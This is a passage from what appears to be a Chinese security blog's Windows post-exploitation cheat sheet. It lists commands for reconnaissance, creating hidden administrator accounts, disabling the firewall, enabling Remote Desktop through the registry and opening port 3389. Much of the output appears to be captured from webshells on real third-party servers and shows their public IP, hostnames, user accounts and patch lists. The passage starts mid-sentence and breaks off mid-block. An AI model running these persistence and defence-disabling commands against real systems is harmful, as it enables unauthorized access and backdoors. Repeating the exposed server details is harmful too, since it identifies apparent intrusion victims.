：该联机在目前已经是等待的状态。 </p></li></ul><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul><li><p>小于1024 的端口通常运行一些网络服务，大于1024 的端口用来与远程机器建立连接。</p></li><li><p>0.0.0.0 是对外开放，通过服务域名、ip可以访问的端口</p></li><li><p>127.0.0.1 只能对本机 localhost访问，也是保护此端口安全性</p></li><li><p>::: 这三个: 的前两个”::”，是“0:0:0:0:0:0:0:0”的缩写，相当于IPv6的”0.0.0.0”，就是本机的所有<a href="https://www.baidu.com/s?wd=IPv6%E5%9C%B0%E5%9D%80&tn=44039180_cpr&fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1YdP16zuynsnHw9Pjczmyfv0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EPHmsnjmvP1cY">IPv6地址</a>，第三个:是IP和端口的分隔符</p></li></ul><h4 id="whoami-PRIV"><a href="#whoami-PRIV" class="headerlink" title="whoami  /PRIV"></a>whoami  /PRIV</h4><p>whoami  /PRIV命令可以查看用户的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; whoami &#x2F;priv</span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line">特殊权限名称                  描述                   状况  </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">SeAuditPrivilege              产生安全稽核           已停用</span><br><span class="line">SeIncreaseQuotaPrivilege      调整处理程序记忆体配额 已停用</span><br><span class="line">SeAssignPrimaryTokenPrivilege 更换处理层权杖         已停用</span><br><span class="line">SeChangeNotifyPrivilege       略过周游检查           已启用</span><br><span class="line">SeImpersonatePrivilege        验证后模拟用户端       已启用</span><br><span class="line">SeCreateGlobalPrivilege       建立全域物件           已启用</span><br></pre></td></tr></table></figure><h4 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net user administrator显示administrator用户的信息</span><br><span class="line"></span><br><span class="line">net user test 123 &#x2F;add  添加一个名为test、密码为123的用户帐户（密码可省略）</span><br><span class="line"></span><br><span class="line">net user test abc将test用户的密码更改为abc</span><br><span class="line"></span><br><span class="line">net user test &#x2F;del将test用户删除</span><br></pre></td></tr></table></figure><ul><li><p>输入不带参数的net user 查看计算机上的用户账号列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; net user</span><br><span class="line">\\ 的使用者帳戶</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest                    </span><br><span class="line">test                     WDeployAdmin             WDeployConfigWriter  </span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            </span><br><span class="line">banli                    </span><br><span class="line">fa080                    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Guest                    </span><br><span class="line">kaichu                   </span><br><span class="line">LUXIAOYU                 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ooo                      </span><br><span class="line">steady       </span><br></pre></td></tr></table></figure></li><li><p>删除用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">net user steady &#x2F;del</span><br><span class="line">Administrator            </span><br><span class="line">banli                    </span><br><span class="line">fa080                    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Guest                    </span><br><span class="line">kaichu                   </span><br><span class="line">LUXIAOYU                 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ooo                      </span><br></pre></td></tr></table></figure></li><li><p>查看用户Administrator的信息</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; net user Administrator</span><br><span class="line">使用者名稱             Administrator</span><br><span class="line">全名                   </span><br><span class="line">註解                   管理電腦/網域的內建帳戶</span><br><span class="line">使用者的註解           </span><br><span class="line">國家/區域碼            <span class="number">000</span> (系統預設值)</span><br><span class="line">帳戶使用中             Yes</span><br><span class="line">帳戶到期               從不</span><br><span class="line">上次設定密碼           <span class="number">2019</span>/<span class="number">5</span>/<span class="number">22</span> 下午 <span class="number">09</span>:<span class="number">17</span>:<span class="number">02</span></span><br><span class="line">密碼到期               <span class="number">2019</span>/<span class="number">7</span>/<span class="number">3</span> 下午 <span class="number">09</span>:<span class="number">17</span>:<span class="number">02</span></span><br><span class="line">可變更密碼             <span class="number">2019</span>/<span class="number">5</span>/<span class="number">22</span> 下午 <span class="number">09</span>:<span class="number">17</span>:<span class="number">02</span></span><br><span class="line">請輸入密碼             Yes</span><br><span class="line">使用者可以變更密碼     Yes</span><br><span class="line">容許的工作站           全部</span><br><span class="line">登入指令檔             </span><br><span class="line">使用者設定檔           </span><br><span class="line">主目錄                 </span><br><span class="line">上次登入時間           <span class="number">2020</span>/<span class="number">6</span>/<span class="number">12</span> 下午 <span class="number">09</span>:<span class="number">00</span>:<span class="number">01</span></span><br><span class="line">可容許的登入時數       全部</span><br><span class="line">本機群組會員           *Administrators       </span><br><span class="line">全域群組會員           *None                 </span><br><span class="line">命令已經成功完成。</span><br></pre></td></tr></table></figure></li><li><p>激活用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user guest &#x2F;active:yes 激活guest用户</span><br></pre></td></tr></table></figure></li></ul><h4 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h4><p>查看操作系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; systeminfo</span><br></pre></td></tr></table></figure><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; systeminfo</span><br><span class="line">主機名稱:             BV550191590002</span><br><span class="line">作業系統名稱:         Microsoft Windows Server <span class="number">2016</span> Datacenter</span><br><span class="line">作業系統版本:         <span class="number">10.0</span><span class="number">.14393</span> N/A 組建 <span class="number">14393</span></span><br><span class="line">作業系統製造商:       Microsoft Corporation</span><br><span class="line">作業系統設定:         獨立伺服器</span><br><span class="line">作業系統組建類型:     Multiprocessor Free</span><br><span class="line">註冊的擁有者:         BV550191590002</span><br><span class="line">註冊公司:             chttl</span><br><span class="line">產品識別碼:           <span class="number">00376</span><span class="number">-40000</span><span class="number">-00000</span>-AA947</span><br><span class="line">原始安裝日期:         <span class="number">2019</span>/<span class="number">2</span>/<span class="number">12</span>, 下午 <span class="number">02</span>:<span class="number">57</span>:<span class="number">55</span></span><br><span class="line">系統開機時間:         <span class="number">2020</span>/<span class="number">6</span>/<span class="number">10</span>, 下午 <span class="number">05</span>:<span class="number">43</span>:<span class="number">40</span></span><br><span class="line">系統製造商:           VMware, Inc.</span><br><span class="line">系統型號:             VMware Virtual Platform</span><br><span class="line">系統類型:             x64-based PC</span><br><span class="line">處理器:               已安裝 <span class="number">2</span> 處理器。</span><br><span class="line">                      [<span class="meta">01</span>]: Intel64 Family <span class="number">6</span> Model <span class="number">37</span> Stepping <span class="number">1</span> GenuineIntel ~<span class="number">2400</span> Mhz</span><br><span class="line">                      [<span class="meta">02</span>]: Intel64 Family <span class="number">6</span> Model <span class="number">37</span> Stepping <span class="number">1</span> GenuineIntel ~<span class="number">2400</span> Mhz</span><br><span class="line">BIOS 版本:            Phoenix Technologies LTD <span class="number">6.00</span>, <span class="number">2015</span>/<span class="number">9</span>/<span class="number">17</span></span><br><span class="line">Windows 目錄:         C:\Windows</span><br><span class="line">系統目錄:             C:\Windows\system32</span><br><span class="line">開機裝置:             \Device\HarddiskVolume1</span><br><span class="line">系統地區設定:         zh-tw;中文 (台灣)</span><br><span class="line">輸入法地區設定:       zh-tw;中文 (台灣)</span><br><span class="line">時區:                 (UTC+<span class="number">08</span>:<span class="number">00</span>) 台北</span><br><span class="line">實體記憶體總計:       <span class="number">8</span>,<span class="number">191</span> MB</span><br><span class="line">可用實體記憶體:       <span class="number">5</span>,<span class="number">350</span> MB</span><br><span class="line">虛擬記憶體: 大小上限: <span class="number">9</span>,<span class="number">471</span> MB</span><br><span class="line">虛擬記憶體: 可用:     <span class="number">6</span>,<span class="number">445</span> MB</span><br><span class="line">虛擬記憶體: 使用中:   <span class="number">3</span>,<span class="number">026</span> MB</span><br><span class="line">分頁檔位置:           C:\pagefile.sys</span><br><span class="line">網域:                 WORKGROUP</span><br><span class="line">登入伺服器:           N/A</span><br><span class="line">Hotfix:               已安裝 <span class="number">17</span> Hotfix。</span><br><span class="line">                      [<span class="meta">01</span>]: KB3192137</span><br><span class="line">                      [<span class="meta">02</span>]: KB4091664</span><br><span class="line">                      [<span class="meta">03</span>]: KB4093137</span><br><span class="line">                      [<span class="meta">04</span>]: KB4132216</span><br><span class="line">                      [<span class="meta">05</span>]: KB4465659</span><br><span class="line">                      [<span class="meta">06</span>]: KB4485447</span><br><span class="line">                      [<span class="meta">07</span>]: KB4498947</span><br><span class="line">                      [<span class="meta">08</span>]: KB4503537</span><br><span class="line">                      [<span class="meta">09</span>]: KB4509091</span><br><span class="line">                      [<span class="meta">10</span>]: KB4512574</span><br><span class="line">                      [<span class="meta">11</span>]: KB4520724</span><br><span class="line">                      [<span class="meta">12</span>]: KB4521858</span><br><span class="line">                      [<span class="meta">13</span>]: KB4524244</span><br><span class="line">                      [<span class="meta">14</span>]: KB4540723</span><br><span class="line">                      [<span class="meta">15</span>]: KB4550994</span><br><span class="line">                      [<span class="meta">16</span>]: KB4562561</span><br><span class="line">                      [<span class="meta">17</span>]: KB4561616</span><br><span class="line">網路卡:               已安裝 <span class="number">1</span> NIC。</span><br><span class="line">                      [<span class="meta">01</span>]: vmxnet3 乙太網路介面卡</span><br><span class="line">                            連線名稱:           乙太網路</span><br><span class="line">                            DHCP 已啟用:          是</span><br><span class="line">                            DHCP 伺服器:        <span class="number">210.71</span><span class="number">.253</span><span class="number">.224</span></span><br><span class="line">                            IP 位址</span><br><span class="line">                            [<span class="meta">01</span>]: <span class="number">210.65</span><span class="number">.11</span><span class="number">.201</span></span><br><span class="line">                            [02]: fe80::250:56ff:fe80:2244</span><br><span class="line">Hyper-V 需求:         偵測到 Hypervisor。將不會顯示 Hyper-V 所需的功能。</span><br></pre></td></tr></table></figure><h4 id="net-group"><a href="#net-group" class="headerlink" title="net group"></a>net group</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">键入不带参数的Net <span class="keyword">group</span>显示服务器名称及服务器的组名称</span><br></pre></td></tr></table></figure><ul><li>net group</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; net <span class="keyword">group</span></span><br><span class="line">這個命令只能用在 Windows 網域控制站。</span><br><span class="line">詳細資料，請輸入 NET HELPMSG <span class="number">3515</span>。</span><br><span class="line"><span class="comment">//该主机不是DC，无法使用此命令。</span></span><br></pre></td></tr></table></figure><h4 id="net-localgroup"><a href="#net-localgroup" class="headerlink" title="net localgroup"></a>net localgroup</h4><p>显示管理员组中的所有成员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Remote Desktop</span><br></pre></td></tr></table></figure><p>将test用户加入到管理员组/远程桌面组中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators service &#x2F;add</span><br></pre></td></tr></table></figure><p>将test用户从管理员组/远程桌面组中删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators test &#x2F;del</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\xampp\htdocs\attachments\date_202006&gt; net localgroup administrators</span><br><span class="line">別名     administrators</span><br><span class="line">註解     Administrators 可以完全不受限制地存取電腦&#x2F;網域</span><br><span class="line">成員</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">key$</span><br><span class="line">test</span><br><span class="line">WDeployAdmin</span><br><span class="line">命令已經成功完成</span><br></pre></td></tr></table></figure><h4 id="查看端口以及端口对应的服务"><a href="#查看端口以及端口对应的服务" class="headerlink" title="查看端口以及端口对应的服务"></a>查看端口以及端口对应的服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看对应的端口</span><br><span class="line">netstat -ano |findstr &quot;3306&quot;</span><br><span class="line">查看对应的服务进程</span><br><span class="line">tasklist | findstr PID</span><br></pre></td></tr></table></figure><h4 id="建立隐藏账号"><a href="#建立隐藏账号" class="headerlink" title="建立隐藏账号"></a>建立隐藏账号</h4><p>建立用户账号时，如果在用户名后面加上$符号，就可以建立一个简单的隐藏账号，如”test$”。在字符界面下执行net user命令，无法查看到这个账号，但是在图形界面的”本地用户和组”中仍然可以看到。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user awd$ 123 &#x2F;add</span><br></pre></td></tr></table></figure><p>安全标识符SID：</p><p>执行”whoami /all”命令查看系统当前用户的SID。SID的最后一部分称为相对标识符RID，RID是500的SID是系统内置Administrator账户，即使重命名，其RID仍保持为500不变。 RID为501的SID是Guest账户，后来新建的用户账户的RID都是从1000开始。</p><h4 id="查看当前在线的用户"><a href="#查看当前在线的用户" class="headerlink" title="查看当前在线的用户"></a>查看当前在线的用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; query user || qwinsta</span><br><span class="line"> 使用者名称         工作阶段名称       识别码  状态    闲置时间    登入时间</span><br><span class="line"> administrator         rdp-tcp#3           1  使用中          .  2020&#x2F;11&#x2F;19 下午 03:32</span><br><span class="line"> 工作阶段名称       使用者名称           识别码    状态    类型    装置 </span><br><span class="line">&gt;console                                     0  已连线  wdcon               </span><br><span class="line"> rdp-tcp                                 65536  接听    rdpwd               </span><br><span class="line"> rdp-tcp#3         Administrator             1  使用中  rdpwd  </span><br></pre></td></tr></table></figure><h4 id="查看当前用户是否在管理员组"><a href="#查看当前用户是否在管理员组" class="headerlink" title="查看当前用户是否在管理员组"></a>查看当前用户是否在管理员组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br><span class="line">別名     administrators</span><br><span class="line">註解     Administrators 可以完全不受限制地存取電腦&#x2F;網域</span><br><span class="line"></span><br><span class="line">成員</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">banli$</span><br><span class="line">Guest</span><br><span class="line">IUSR_TELNET</span><br><span class="line">TelNet</span><br><span class="line">命令執行成功</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user administrator</span><br><span class="line">本機群組會員           *Administrators       *Performance Monitor U</span><br><span class="line">                       *SQLServer2005SQLBrows*SQLServerMSASUser$REN</span><br><span class="line">                       *SQLServerMSSQLUser$re*SQLServerSQLAgentUser</span><br><span class="line">通用群組會員           *None</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group administrators</span><br><span class="line">该命令只能在域控制器中使用。</span><br></pre></td></tr></table></figure><h4 id="查看防火墙"><a href="#查看防火墙" class="headerlink" title="查看防火墙"></a>查看防火墙</h4><p>显示防火墙状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; netsh firewall show config</span><br><span class="line">网域 设定档组态:</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">操作模式                          &#x3D; 停用</span><br><span class="line">例外模式                          &#x3D; 启用</span><br><span class="line">多点传送&#x2F;广播回应模式             &#x3D; 启用</span><br><span class="line">通知模式                          &#x3D; 启用</span><br><span class="line">网域 设定档的服务设定:</span><br><span class="line">模式     自订           名称</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">启用       否           档案及印表机共用</span><br><span class="line">网域 设定档允许的程式设定:</span><br><span class="line">模式     名称 &#x2F; 程式</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">启用       Message Queuing &#x2F; C:\WINDOWS\system32\mqsvc.exe</span><br><span class="line">网域 设定档的连接埠设定:</span><br><span class="line">连接埠 通讯协定  模式       名称</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">139    TCP       启用       NetBIOS Session Service</span><br><span class="line">445    TCP       启用       SMB over TCP</span><br><span class="line">137    UDP       启用       NetBIOS Name Service</span><br><span class="line">138    UDP       启用       NetBIOS Datagram Service</span><br><span class="line">标准 设定档组态:</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">操作模式                          &#x3D; 启用</span><br><span class="line">例外模式                          &#x3D; 启用</span><br><span class="line">多点传送&#x2F;广播回应模式             &#x3D; 启用</span><br><span class="line">通知模式                          &#x3D; 启用</span><br><span class="line">标准 设定档的服务设定:</span><br><span class="line">模式     自订           名称</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">启用       否           远端桌面</span><br><span class="line">标准 设定档允许的程式设定:</span><br><span class="line">模式     名称 &#x2F; 程式</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">启用       3389 &#x2F; C:\wmpub\wmiislog\Saom\3389.exe</span><br><span class="line">启用       3389 &#x2F; C:\Documents and Settings\IUSR_TELNET\桌面\3389.exe</span><br><span class="line">标准 设定档的连接埠设定:</span><br><span class="line">连接埠 通讯协定  模式       名称</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">80     TCP       启用       JCINWEB</span><br><span class="line">21     TCP       启用       FTP</span><br><span class="line">3389   TCP       启用       远端桌面</span><br><span class="line">记录设定:</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">档案位置        &#x3D; C:\WINDOWS\pfirewall.log</span><br><span class="line">最大档案大小    &#x3D; 4096 KB</span><br><span class="line">丢弃的封包      &#x3D; 停用</span><br><span class="line">连线            &#x3D; 停用</span><br><span class="line">存取被拒。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">查看防火墙规则对某端口的规则</span><br><span class="line">netsh advfirewall firewall show rule name&#x3D;all</span><br><span class="line">規則名稱:                             遠端桌面 - 使用者模式 (TCP-In)</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">啟用: 是</span><br><span class="line">方向: 在</span><br><span class="line">設定檔:                               網域,私人,公用</span><br><span class="line">群組: 遠端桌面</span><br><span class="line">LocalIP:                              任一</span><br><span class="line">RemoteIP:                             任一</span><br><span class="line">通訊協定:                             TCP</span><br><span class="line">本機連接埠:                           3389</span><br><span class="line">遠端連接埠:                           任一</span><br><span class="line">邊緣周遊:                             否</span><br><span class="line">動作: 允許</span><br></pre></td></tr></table></figure><h5 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winserver 2003之前：netsh firewall set opmode disable</span><br><span class="line">winserver 2003之后：netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h5 id="开启防火墙"><a href="#开启防火墙" class="headerlink" title="开启防火墙"></a>开启防火墙</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode mode&#x3D;enable</span><br></pre></td></tr></table></figure><h4 id="3389端口"><a href="#3389端口" class="headerlink" title="3389端口"></a>3389端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询远程桌面服务是否开启</span><br><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections</span><br></pre></td></tr></table></figure><p>1表示关闭，0表示开启 <img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200613203237617.png" alt="image-20200613203237617"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询远程桌面服务端口</span><br><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber</span><br></pre></td></tr></table></figure><p>端口号十六进制表示，0xd3d转换成十进制后为3389</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200613203325747.png" alt="image-20200613203325747"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令行开启远程桌面</span><br><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br><span class="line">命令行关闭远程桌面</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f</span><br></pre></td></tr></table></figure><p>关闭远程桌面</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200613204834299.png" alt="image-20200613204834299"></p><p>突破防火墙连接3389端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">防火墙默认阻断了3389的连接，需要手动开启，执行如下命令</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br><span class="line">或者直接关闭防火墙</span><br><span class="line">netsh firewall set opmode mode&#x3D;disable</span><br></pre></td></tr></table></figure><p>常见用户尝试连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\WWW\yxcms&gt; net user whoami Steady123 &#x2F;add</span><br><span class="line">命令成功完成。</span><br><span class="line"> </span><br><span class="line">C:\phpStudy\WWW\yxcms&gt; net localgroup administrators whoami &#x2F;add</span><br></pre></td></tr></table></figure><h4 id="查看系统进程"><a href="#查看系统进程" class="headerlink" title="查看系统进程"></a>查看系统进程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 